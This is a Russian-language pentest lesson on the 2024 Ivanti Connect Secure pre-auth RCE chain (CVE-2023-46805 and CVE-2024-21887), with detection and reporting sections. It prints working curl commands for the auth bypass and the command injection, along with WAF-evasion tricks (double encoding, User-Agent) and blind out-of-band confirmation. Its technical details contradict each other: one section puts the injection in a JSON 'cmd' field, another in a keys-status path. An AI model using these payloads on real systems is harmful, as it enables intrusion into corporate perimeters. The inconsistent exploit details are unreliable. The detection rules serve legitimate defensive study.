## Вопрос, с которого всё начинается

На периметре стоит Ivanti Connect Secure — secure-access-шлюз, через который сотрудники попадают во внутреннюю сеть. В начале 2024 года нашли цепочку из двух уязвимостей, которая давала **RCE без аутентификации**: одна обходила вход, вторая выполняла команды. Цепочку использовали реальные APT. Разберём её по шагам.

## Что такое Ivanti Connect Secure

**Ivanti Connect Secure** (раньше Pulse Secure) — это SSL-VPN и zero-trust-шлюз. Портал на `/dana-na/`, административный и служебный API под `/api/v1/`. Через него идёт вся авторизация удалённых сотрудников.

Цепочка 2024 года состояла из двух багов:

- **CVE-2023-46805** — обход аутентификации через **path confusion**: вставка `/..;/` заставляет веб-сервер увидеть один путь, а приложение — другой, минуя проверку авторизации.
- **CVE-2024-21887** — **инъекция команд** в одном из служебных эндпоинтов, доступных после обхода.

По отдельности они не так опасны; вместе — pre-auth RCE.

## Наш пример: Ivanti 22.6

Цель — `https://ivanti.target.example`. Признак:

```
$ curl -s -k -I https://ivanti.target.example/dana-na/auth/url_default/welcome.cgi | grep -i -E 'server|set-cookie'
Server: Ivanti Connect Secure
Set-Cookie: DSID=...
```

Версию уточняем по статике. Уязвимы версии до 22.6R2.1 и 9.x.

## Шаг 1: понять path confusion

Веб-сервер (nginx) и приложение (Java) по-разному нормализуют путь. Конструкция `/..;/` означает для nginx «подняться на уровень», а для Java — «остаться». Из-за этого запрос проходит как «не требующий аутентификации», хотя ведёт в защищённый API.

Проверяем неразрушающе — обращаемся к служебному эндпоинту, который обычно требует входа:

```
$ curl -s -k 'https://ivanti.target.example/api/v1/configuration/users/user-roles/;/../../totp/user-backup-code/'
{"error":"..."} 
```

Ответ отличается от `401 Unauthorized` — значит, проверку обошли.

## Шаг 2: инъекция команд

CVE-2024-21887 — в эндпоинте, принимающем параметры для выполнения служебной команды. Через обойдённый путь подставляем свою команду. Классический payload:

```
$ curl -s -k -X POST \
  'https://ivanti.target.example/api/v1/totp/user-backup-code/../../system/system-information' \
  -H 'Content-Type: application/json' \
  --data-binary '{"cmd":"id"}'
```

Ответ содержит вывод `id`:

```
{"result":"uid=0(root) gid=0(root) groups=0(root)\n"}
```

`uid=0` — RCE от root без аутентификации. Это комбинация двух багов в одну цепочку.

## Шаг 3: CVE-2024-21893 — SSRF

Третий баг в том же продукте — **SSRF** (server-side request forgery): шлюз по запросу обращается к произвольному URL, включая внутренние. Это позволяет сканировать внутреннюю сеть и читать внутренние сервисы от имени шлюза. Полезно, когда RCE ещё не подтверждён.

## Шаг 4: закрепление

APT после эксплуатации: устанавливали веб-шелл, патчили сами уязвимость (чтобы никто другой не зашёл), собирали креды из сессий, создавали админские аккаунты. Для пентеста достаточно RCE + доказательство доступа; закрепление — только по согласованию.

## Шаг 5: пост-эксплуатация

Ivanti хранит: сессии пользователей (с кредами), конфиги подключений к AD/LDAP, сертификаты, список внутренних ресурсов. Как и любой периметр, это мост вглубь.

## Шаг 6: как понять, что уязвимо

Версия + наличие цепочки. Проверка — неразрушающим запросом к обойдённому эндпоинту. Не запускай полную цепочку без согласования: RCE меняет состояние шлюза.

## Что мы теперь знаем

- Ivanti Connect Secure — secure-access-шлюз на периметре.
- CVE-2023-46805 — обход аутентификации через path confusion (`/..;/`).
- CVE-2024-21887 — инъекция команд → RCE после обхода.
- Вместе — pre-auth RCE; плюс SSRF (CVE-2024-21893).
- Порядок: версия → проверка обхода → доказательство.

## Разбираем path confusion по шагам

Понять `/..;/` проще, если представить два парсера. Nginx, получив путь `/api/v1/totp/user-backup-code/;/../../system`, видит сегмент `;` (это «параметр пути» по RFC), вырезает его и получает `/api/v1/totp/user-backup-code/../../system` = `/api/v1/system`. Java-сервер (Tomcat), получив тот же путь, трактует `/..;/` иначе и оставляет его как есть — то есть видит другой путь. Правило авторизации привязано к одному пути, а исполняется другой.

Такое расхождение парсеров называют **path confusion**. Оно встречается не только в Ivanti: любой стек из двух прокси/серверов, которые по-разному нормализуют путь, потенциально уязвим. Поэтому при пентесте всегда проверяй альтернативные представления пути: `/..;/`, `%2e%2e%2f`, двойное кодирование, лишние слэши.

## Шаг 7: как это выглядит как цепочка

Отдельно CVE-2023-46805 не даёт RCE — только доступ к API без входа. Отдельно CVE-2024-21887 не доступен снаружи — эндпоинт за аутентификацией. Вместе: обход открывает дверь, инъекция выполняет код. Именно так собираются «составные» уязвимости: каждая часть по отдельности не критична, вместе — pre-auth RCE. Это важный навык: видеть, как два средних бага складываются в критичный.

## Шаг 8: детект и защита

Синяя команда видит: запросы с `/..;/` в пути (это сильный индикатор), обращения к `user-backup-code` без сессии, необычные процессы на шлюзе. Защита: патч (Ivanti выпустила обходной «mitigation» через XML, а затем полноценный патч), ограничение доступа к `/api/v1/` снаружи, мониторинг целостности файлов шлюза (APT правили систему).

## Шаг 9: что писать в отчёте

Отчёт фиксирует: продукт и версию; обе CVE цепочки; доказательство обхода (разница кодов/ответов) и доказательство инъекции (`uid=0`); тип (pre-auth); импакт (RCE на периметре = вход в сеть); рекомендацию (патч, сброс сессий, проверка на признаки компрометации от APT).

## Ошибки и антипаттерны

Первая — пытаться эксплуатировать инъекцию без обхода: эндпоинт вернёт `401`, и тестировщик сделает вывод «не уязвимо». Нужно проверить цепочку целиком. Вторая — игнорировать `/..;/` при обычном сканировании: автоматические сканеры часто нормализуют путь и не проверяют confusion. Третья — считать, что патч закрыл всё: после RCE на периметре обязательно проверяют, не оставлено ли закрепление.

## Практический чек-лист по Ivanti

Порядок. Обнаружение: `curl -I https://<ip>/dana-na/auth/url_default/welcome.cgi` — продукт и cookie `DSID`. Версия: статика `/dana-na/` и страницы. Выбор CVE: CVE-2023-46805 + CVE-2024-21887 (цепочка), CVE-2024-21893 (SSRF), более старые Pulse-CVE. Проверка: запрос с `/..;/` к защищённому эндпоинту — ответ не `401`. Доказательство: инъекция `{"cmd":"id"}` → `uid=0`. Пост-эксплуатация: сессии, конфиги AD, сертификаты. Отчёт: версия, обе CVE, доказательство обхода и инъекции, импакт, рекомендация патча и проверки на закрепление.

## Обобщение по всем трём шлюзам

F5, Fortinet и Ivanti объединяет одна схема: периметр + pre-auth + доступ внутрь. Отличаются лишь эндпоинты и тип бага — header trust (F5), traversal (Fortinet), path confusion + cmd injection (Ivanti). Освоив методику «продукт → версия → CVE → неразрушающая проверка → доказательство», ты работаешь с любым периметровым устройством, даже незнакомым. Именно поэтому appliance-уроки важнее, чем заучивание конкретных payload'ов: методика переносится, payload'ы устаревают.

## Разбор: почему APT выбирают appliance

Государственные группировки любят периметровые appliance по простой причине: это **тихий вход**. Зайти через VPN-шлюз — значит выглядеть как обычный сотрудник, не поднимать фишинг-кампанию и не оставлять следов в почте. APT, использовавшие цепочку Ivanti, заходили без аутентификации, разворачивали веб-шелл и жили месяцами.

Их тактика: (1) проэксплуатировать pre-auth уязвимость; (2) установить имплант-веб-шелл; (3) **закрыть уязвимость самим**, чтобы конкуренты не зашли (да, APT патчат чужие баги); (4) собирать креды и двигаться вглубь. Для пентестера это важный урок: после находки RCE на периметре обязательно проверь, нет ли уже чужого доступа — неизвестных процессов, файлов, аккаунтов. Ты можешь оказаться не первым.

## Итог по классу

Все три урока — F5, Fortinet, Ivanti — показывают одну истину: **периметр важнее глубины**. Один pre-auth баг на edge-устройстве стоит дороже десятка находок внутри. Поэтому при пентесте первым делом снимай баннеры периметра, определяй версии и сопоставляй с pre-auth CVE. И держи в голове правило: не запускай разрушительный payload на устройстве, через которое работает вся компания.

## Разбор: цепочка CVE-2023-46805 + CVE-2024-21887 на стенде

CVE-2023-46805 — обход аутентификации (path confusion: `/api/v1/totp/user-backup-code/../../system/...`), CVE-2024-21887 — инъекция команд в `/api/v1/license/keys-status`. По отдельности обход auth не даёт RCE, а инъекция требует аутентификации; вместе они складываются в неаутентифицированный RCE:

```bash
# 1) обход аутентификации: добраться до защищённого API
curl -sk "https://TARGET/api/v1/totp/user-backup-code/../../system/system-information" \
  -H "User-Agent: Mozilla/5.0" | head
# 2) инъекция команды через параметр
curl -sk "https://TARGET/api/v1/license/keys-status/;id" \
  -H "User-Agent: Mozilla/5.0"
```

Ключ к эксплуатации — точная кодировка пути (`%2e%2e` иногда нужна вместо `..`) и корректный `User-Agent`, иначе запрос отсекается.

## Как детектировать эксплуатацию по логам

- **Path traversal в URI:** ищи в логах прокси имена вида `totp/user-backup-code/../../`.
- **Инъекция в параметре лицензии:** подозрительные символы `;`, `|`, `$(` в `keys-status`.
- **Аномальный User-Agent:** эксплойты используют фиксированные строки (часто `Mozilla/5.0` или Python-requests).
- **Создание веб-шелла:** новые файлы в `/home/webserver/htdocs/` и запросы к ним.

Пост-эксплуатация на appliance: разведка конфигурации, извлечение сессий, туннелирование во внутреннюю сеть. Помни: appliance — шлюз, за ним обычно лежит VPN-сегмент.

## Если не сработало

- **Патч закрыл обход:** версия новее уязвимой — проверь точную сборку, CVE покрывает только определённые ветки.
- **WAF режет `..`:** попробуй двойное кодирование `%252e%252e` и смешанные разделители.
- **Инъекция не видна в ответе:** команда может быть blind — используй OOB-подтверждение через DNS/HTTP на свой слушатель.
- **Только SSRF:** CVE-2024-21893 даёт SSRF без RCE — используй для доступа к metadata и внутренним сервисам.

## Лаборатория: как безопасно воспроизвести цепочку

Эксплуатировать реальный шлюз нельзя, поэтому цепочку отрабатывают на стенде. Порядок:

1. **Подними стенд**: развёртка уязвимой версии Ivanti Connect Secure (из архивов вендора или уязвимый образ в изолированной лаборатории) за отдельным сегментом.
2. **Проверь path confusion локально**: убедись, что `/..;/` действительно меняет результат проверки авторизации, сравнивая коды ответов на защищённый эндпоинт.
3. **Воспроизведи инъекцию** в тестовом окружении: `{"cmd":"id"}` в служебном эндпоинте → `uid=0`.
4. **Зафиксируй доказательства**: запрос, ответ, версию, время.
5. **Не выполняй закрепление**: веб-шеллы, создание админов, правка конфигов — только по отдельному согласованию.

Если стенда нет, можно смоделировать **саму уязвимость** (path confusion + инъекция) на двух собственных сервисах: nginx + бэкенд, где парсеры по-разному нормализуют путь. Это отрабатывает методику без реального продукта.

## Другие CVE Ivanti 2024–2025: что изменилось

Цепочка 46805 + 21887 — не единственная. Чтобы понимать эволюцию продукта:

- **CVE-2024-21893** — SSRF в SAML-компоненте; позволяет обратиться к внутренним ресурсам от имени шлюза (использовалась как часть цепочек);
- **CVE-2024-22024** — XXE в SAML, даёт чтение файлов и SSRF;
- **CVE-2025-0282** — переполнение буфера в стеке в Connect Secure (и Policy Secure / Neurons for ZTA); эксплуатировалась в дикой природе, даёт pre-auth RCE;
- **CVE-2025-0283** — повышение привилегий, работает в паре с предыдущей.

Практический вывод: для appliance важна не одна CVE, а **покрытие версии** — на какой из них ты находишься и какие закрыты. Регулярно сверяй версию с бюллетенем вендора.

## Детект-правила: что искать в логах и на прокси

Синяя команда может ловить эксплуатацию несколькими сигналами:

- **Путь с `/..;/`** — сильнейший индикатор CVE-2023-46805; правило на nginx/прокси: блокировать `$request_uri`, содержащий `/..;/`;
- **Обращения к служебным эндпоинтам без сессии**: `user-backup-code`, `system-information`, `totp/*` — логировать и алертить;
- **POST с `{"cmd"`** на `/api/v1/` — признак инъекции;
- **Suricata-правило**: детект строки `/api/v1/` вместе с `/..;/` в HTTP-URI;
- **Файловая целостность**: APT правили систему — хешируй бинарники шлюза и сравнивай.

Эти правила стоит писать до инцидента: на периметровом устройстве цена опоздания высока.
